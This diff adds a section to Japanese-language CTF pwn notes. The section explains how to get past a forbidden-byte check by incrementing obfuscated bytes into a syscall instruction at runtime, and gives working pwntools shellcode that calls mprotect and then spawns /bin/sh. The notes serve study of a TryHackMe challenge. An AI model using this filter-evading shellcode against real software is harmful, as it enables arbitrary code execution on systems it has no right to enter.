@@ -287,3 +287,38 @@ p.sendline(payload)
 p.recvline()
 p.interactive()
 ```
+
+## 禁止バイトチェックの回避
+
+https://www.ztz0.com/writeups/2025/tryhackme-hackfinity-battle/pwn/void-execution
+
+インクリメントを使ってチェックを回避する巧妙な方法。  
+インクリメント後、0x0f, 0x05 となりsyscallが実行される。
+
+1個目のcallは、メモリ更新を可能にするため、  
+mprotect(0xC0DE0000,0x64,7) を呼び出している。
+
+0x68732f6e69622f は "/bin/sh" の意味。
+
+```python
+shellcode = asm(f'''  
+    lea rbx, [rcx - 11]
+    mov rdi, 0xC0DE0000
+    mov rsi, 0x64
+    mov rdx, 0x7
+    call rbx
+
+    mov rax, 0x3b
+    mov rdi, 0x68732f6e69622f
+    push rdi
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+
+    inc byte ptr [rip + syscall]
+    inc byte ptr [rip + syscall + 1]
+    
+syscall:
+    .byte 0x0e, 0x04
+''')
+```
